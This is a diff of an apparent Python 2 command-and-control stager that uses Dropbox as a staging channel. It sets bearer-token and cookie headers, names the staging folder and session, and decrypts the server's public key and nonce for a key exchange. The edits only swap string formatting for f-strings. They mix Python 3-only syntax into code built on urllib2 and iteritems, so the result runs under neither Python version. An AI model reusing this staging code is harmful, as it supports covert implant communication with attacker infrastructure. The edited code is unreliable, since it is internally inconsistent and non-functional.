@@ -24,7 +24,7 @@ def post_message(uri, data):
     global headers
     req = urllib2.Request(uri)
     for key, value in headers.iteritems():
-        req.add_header("%s"%(key),"%s"%(value))
+        req.add_header(f"{key}", f"{value}")
 
     if data:
         req.add_data(data)
@@ -63,13 +63,13 @@ for headerRaw in headersRaw:
         headerKey = headerRaw.split(":")[0]
         headerValue = headerRaw.split(":")[1]
         if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
+            headers['Cookie'] = f"{headers['Cookie']};{headerValue}"
         else:
             headers[headerKey] = headerValue
     except:
         pass
 
-headers['Authorization'] = "Bearer %s" % (t)
+headers['Authorization'] = f"Bearer {t}"
 headers['Content-Type'] = "application/octet-stream"
 headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_1.txt\"}" % (stagingFolder, sessionID)
 
@@ -97,7 +97,7 @@ except:
     exit()
 # decrypt the server's public key and the server nonce
 packet = aes_decrypt_and_verify(stagingKey, raw)
-nonce = packet[0:16]
+nonce = packet[:16]
 serverPub = int(packet[16:])
 
 # calculate the shared secret
